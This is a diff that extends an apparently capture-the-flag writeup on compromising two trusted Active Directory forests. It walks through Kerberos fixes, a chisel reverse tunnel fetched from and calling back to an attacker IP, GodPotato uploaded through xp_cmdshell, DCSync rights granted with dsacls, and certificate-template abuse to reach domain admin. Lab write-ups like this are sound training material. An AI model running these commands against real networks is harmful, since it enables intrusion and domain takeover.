@@ -45,12 +45,14 @@ Host script results:
 |_clock-skew: 14m51s
 ```
 
-The domain is `ping.htb`, the host is DC1, and port 2179 (`vmrdp`) means Hyper-V is installed on this box, which matters a lot later. The clock is also off by a few minutes, which only gets worse once I start generating Kerberos tickets, so I fix it and the hosts file up front:
+The domain is `ping.htb`, the host is DC1, and port 2179 (`vmrdp`) means Hyper-V is installed on this box, which matters a lot later. The clock is also off, which only gets worse once I start generating Kerberos tickets, so I fix it and the hosts file up front:
 
 ```terminal
 ❯ sudo ntpdate -u 10.129.245.56
 ❯ echo "10.129.245.56  ping.htb dc1.ping.htb DC1" | sudo tee -a /etc/hosts
 ```
+
+*Gotcha: the drift isn't constant. On this run it was 14 minutes at the first scan but had drifted to almost 8 hours by the time I came back to it later, and a long session can still push it past Kerberos's 5-minute default tolerance mid-engagement. Any `KRB_AP_ERR_SKEW` later in this writeup, however unrelated it looks, means re-running `ntpdate` before touching the actual problem.*
 
 This is also a cross-forest box, `ping.htb` trusts `pong.htb`, so from the start I keep a `krb5.conf` that knows about both realms, rather than discovering that need later and redoing every ticket:
 
@@ -149,6 +151,8 @@ Requesting a certificate from the template needs a bit of fixing: the default RP
 ping\c.roberts
 ```
 
+*Gotcha: `evil-winrm` has no real one-liner flag for running a single non-interactive command against a Kerberos session; its own `-c`/help text for that doesn't apply here. Every remote command in the rest of this box goes in as a line piped into its stdin, not as an argument.*
+
 ## Finding the second forest
 
 Inside the WinRM session, `C:\Users` has a folder for `Pong_gMSA$`, an account this session has never heard of. A gMSA only exists inside a specific domain, and this one's name is a strong hint there's a second domain called something like `pong`, matching the box's own name:
@@ -178,7 +182,28 @@ Port 445 (SMB) being open is close to proof that 192.168.2.2 is a live Windows b
 
 ## Pivoting into 192.168.2.0/24
 
-`chisel` gets a reverse SOCKS5 proxy working first, but needs `proxychains` wrapping every tool. `ligolo-ng` is a real routed tunnel over a TUN interface instead, so once the route is added any tool talks to the internal range directly:
+`chisel` gets a reverse SOCKS5 proxy working first, but needs `proxychains` wrapping every tool, and getting it onto DC1 at all has its own edge cases. The two binaries have to match versions exactly or the client silently fails to negotiate with the server. `evil-winrm`'s own interactive upload command stalls indefinitely on the ~10MB binary (0 bytes/sec on the tunnel for 15+ minutes), so it's faster to serve it from a local `python3 -m http.server` and pull it down instead; `Invoke-WebRequest` without disabling its progress bar then corrupts the download mid-transfer, because rendering the progress bar during a long pull is enough to stall the WinRM session itself:
+
+```terminal
+*Evil-WinRM* PS> $ProgressPreference = "SilentlyContinue"
+*Evil-WinRM* PS> Invoke-WebRequest http://10.10.16.135:8000/chisel.exe -OutFile chisel.exe
+```
+
+```terminal
+❯ chisel server -p 8888 --reverse
+```
+
+```terminal
+*Evil-WinRM* PS> Start-Process .\chisel.exe -ArgumentList "client http://10.10.16.135:8888 R:socks" -WindowStyle Hidden
+```
+
+Through that SOCKS proxy, `proxychains4 nmap -sT` reports every port on 192.168.2.2 as filtered, which looks like the pivot doesn't actually work. It does; `nmap`'s `-sT` state machine expects a real RST on a closed port, and SOCKS never forwards one, so a plain connect test is the right tool to trust here instead:
+
+```terminal
+❯ proxychains4 -q -f pc.conf curl -v --connect-timeout 8 telnet://192.168.2.2:445
+```
+
+`ligolo-ng` is a real routed tunnel over a TUN interface instead of a SOCKS proxy, so once the route is added any tool talks to the internal range directly with no wrapping at all:
 
 ```terminal
 ❯ sudo ligolo-proxy -selfcert
@@ -314,7 +339,9 @@ With that key, `impacket-getTGT -aesKey` gets a real ticket for `Pong_gMSA$@PONG
 
 ## A JEA bypass and a leaked password
 
-`Pong_gMSA$` is a `pong.htb` account, but the next target, a restricted WinRM endpoint, lives back on DC1 in `ping.htb`. Reaching it with a tool that relies on the OS's own GSSAPI stack (not a Python library doing its own crypto) needs four separate fixes together: a `[capaths]` block in `krb5.conf` so MIT Kerberos follows the cross-realm referral automatically, the right SPN (`WSMAN/dc1.ping.htb`, confirmed by reading DC1's own `servicePrincipalName` attribute, not `http/...`), a genuine MIT-standard ccache built with a real `kinit -k -t <keytab>` (real GSSAPI tools reject a hand-built impacket ccache even though `klist` reads it fine), and the right alias order in `/etc/hosts` (GSSAPI picks the *first* alias listed for an IP when building its SPN).
+`Pong_gMSA$` is a `pong.htb` account, but the next target, a restricted WinRM endpoint, lives back on DC1 in `ping.htb`. Reaching it with a tool that relies on the OS's own GSSAPI stack (not a Python library doing its own crypto) needs four separate fixes together, and missing any one of them produces a different, unrelated-looking GSSAPI error: a `[capaths]` block in `krb5.conf` so MIT Kerberos follows the cross-realm referral automatically, the right SPN (`WSMAN/dc1.ping.htb`, confirmed by reading DC1's own `servicePrincipalName` attribute, not `http/...`), a genuine MIT-standard ccache built with a real `kinit -k -t <keytab>` (real GSSAPI tools reject a hand-built impacket ccache even though `klist` reads it fine), and the right alias order in `/etc/hosts` (GSSAPI picks the *first* alias listed for an IP when building its SPN, so `ping.htb dc1.ping.htb` in that order silently targets `WSMAN/ping.htb` instead).
+
+*Gotcha: `pypsrp` exposes a `negotiate_hostname_override` kwarg that looks like a shortcut around the `/etc/hosts` ordering problem. It does nothing with `auth='kerberos'`, only with `auth='negotiate'` (confirmed by reading `pypsrp`'s own `wsman.py`), so the alias order has to be fixed at the OS level instead.*
 
 ```terminal
 ❯ ktutil
@@ -391,11 +418,19 @@ Find System Token: True
 CurrentUser: NT AUTHORITY\SYSTEM
 ```
 
-One real gotcha here: any file write performed by a process spawned through GodPotato's impersonation chain silently reports success but the file is gone moments later, because that token's logon session is transient. Persistent writes have to happen from the outer `svc_sql` process instead, with GodPotato used only to capture command output. `user.txt`, on C.Carlssen's desktop, is read this way.
+Two real gotchas here. Any file write performed by a process spawned through GodPotato's impersonation chain silently reports success but the file is gone moments later, because that token's logon session is transient; persistent writes have to happen from the outer `svc_sql` process instead, with GodPotato used only to capture command output. And spawning a second full `powershell.exe` host process nested *under* a GodPotato-impersonated process reliably kills the `xp_cmdshell`/TDS connection it's running through, across every invocation style tried, so each GodPotato call needs to stay single-level: one command or one pre-compiled binary, never another PowerShell host nested inside it. `user.txt`, on C.Carlssen's desktop, is read this way.
 
 ## DCSync, and the real cross-forest bridge
 
-SYSTEM on a genuine domain controller already has implicit full control over the domain object's own ACL, so granting yourself DCSync rights doesn't need any existing privilege, just `dsacls`:
+Getting back to SYSTEM on DC2 for this phase meant re-running GodPotato, and it needed a new workaround: `C:\Windows\Temp` genuinely doesn't exist on DC2 (`dir` returns `File Not Found`), unlike DC1 where that path is fine, and DC2 can't reach my attack box directly over HTTP to download anything. The binary has to go up in a chunked, pasted upload instead:
+
+```terminal
+SQL> xp_cmdshell echo <base64 chunk 1> >> C:\Users\Public\gp.b64
+SQL> xp_cmdshell echo <base64 chunk 2> >> C:\Users\Public\gp.b64
+SQL> xp_cmdshell certutil -decode C:\Users\Public\gp.b64 C:\Users\Public\GodPotato.exe
+```
+
+Checking the decoded file's size against the real binary's size confirms the transfer wasn't corrupted before relying on it. SYSTEM on a genuine domain controller already has implicit full control over the domain object's own ACL, so granting yourself DCSync rights doesn't need any existing privilege, just `dsacls`:
 
 ```terminal
 C:\> dsacls "DC=pong,DC=htb" /G "PONG\Pong_gMSA$:CA;Replicating Directory Changes"
@@ -412,7 +447,7 @@ This dumps every account in `pong.htb`, including `PING$` (the inter-forest trus
 
 ## ESC4 to ESC1 on the ping.htb CA
 
-`CA Managers` sounds like it should mean CA-level RPC rights, the classic ESC7 "manage CA" primitive, and that was my first guess: `certipy-ad ca -issue-request`/`-backup` as R.Martinelli, crossing the trust, both fail with a DCOM bind error (`invalid_checksum`) that a same-forest control test shows is specific to the cross-realm DCOM layer, not a permissions problem. Checking what's actually documented for this template rather than continuing to push on RPC, the real right is a plain-LDAP WriteDacl on the certificate template object itself:
+`CA Managers` sounds like it should mean CA-level RPC rights, the classic ESC7 "manage CA" primitive, and that was my first guess: `certipy-ad ca -issue-request`/`-backup` as R.Martinelli, crossing the trust, both fail with a DCOM bind error (`invalid_checksum`) that a same-forest control test shows is specific to the cross-realm DCOM layer, not a permissions problem. `certipy-ad`'s own `template` subcommand, the normal way to automate this kind of flip, just hangs indefinitely cross-realm too, even after the clock-skew fix, which is consistent with the same DCOM sensitivity rather than a second unrelated bug. Checking what's actually documented for this template rather than continuing to push on RPC and DCOM, the real right is a plain-LDAP WriteDacl on the certificate template object itself, reachable with `bloodyAD` instead:
 
 ```terminal
 ❯ export KRB5CCNAME=R.Martinelli@ldap_dc1.ping.htb@PING.HTB.ccache
@@ -464,10 +499,14 @@ With the template ESC1-exploitable, a certificate request naming `administrator@
     "cmd /c type C:\Users\Administrator\Desktop\root.txt"
 ```
 
+*Gotcha: `certipy-ad auth` has no `-sid` flag at all, it only exists on `certipy-ad req`; a `PKINIT` failure with `Object SID mismatch` means going back and re-requesting the certificate with `-sid`, not hunting for an auth-time option that doesn't exist. The first `wmiexec` attempt here also timed out at the default 30 seconds for this cross-network call; a longer client-side timeout on the retry fixed it with no other change, which is a reminder that not every timeout this deep in a chain means the ticket or the access itself is bad.*
+
 `root.txt` is on the Administrator desktop on DC1. Full compromise of both forests: `ping.htb` through this certificate chain, `pong.htb` earlier through RBCD and GodPotato.
 
 ## Takeaways
 
 The two domain controllers are dual-homed across a Hyper-V internal switch that isn't visible from outside, so the second forest never shows up in a port scan, only after there's already a shell on the first DC. A group's name is not proof of what it actually grants: `CA Managers` reads like ESC7 CA-management rights, but the real, working primitive is a direct WriteDacl on one certificate template object, reachable over plain LDAP even when the CA's own DCOM interface breaks cross-realm. Forest trusts are SID-filtered by default, so a forged cross-forest ticket with an injected SID gets through authentication but not authorization, while a genuine foreign security principal sitting in a privileged group is the real, unforged bridge the box wants. And object ownership in AD is itself a privilege escalation primitive: owning `gMSA Managers` through a group's membership was enough to grant full control over it with no ACE ever naming c.roberts directly.
+
+Most of the actual difficulty on this box wasn't the exploit logic, it was getting the Kerberos tooling to cooperate across two realms: a referral has to be built by hand for anything that only knows how to authenticate inside one domain, a hand-built impacket ccache gets rejected by anything using the system's own GSSAPI stack, SPNs and `/etc/hosts` alias order both matter in ways that fail silently, and the clock has to stay in sync the entire time. None of that shows up in a typical single-domain AD box, and almost every "it should just work" step here needed one of these fixed first.
 
 <%= render("../../_partials/post-footer.html", { url, title, tags, prevPost, nextPost }) %>
